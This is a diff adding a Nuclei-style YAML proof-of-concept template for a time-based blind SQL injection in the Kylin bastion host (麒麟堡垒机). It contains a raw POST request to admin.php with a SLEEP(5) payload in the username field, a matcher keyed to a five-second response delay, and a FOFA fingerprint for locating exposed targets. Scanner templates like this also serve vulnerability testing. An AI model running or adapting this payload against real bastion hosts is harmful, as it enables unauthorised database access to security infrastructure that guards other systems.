@@ -1,0 +1,39 @@
+id: poc-zlgg4ofnz6gzhedr
+info:
+  name: 北京中远麒麟科技有限公司麒麟堡垒机存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zlgg4ofnz6gzhedr
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zlgg4ofnz6gzhedr
+    fofa: body="url=\"admin.php?controller=admin_index&action=get_user_login_fristauth&username="
+http:
+- raw:
+  - 'POST /admin.php?controller=admin_commonuser HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 78
+
+    Accept: */*
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+
+    username=admin'' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND ''AAdm''=''AAdm'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
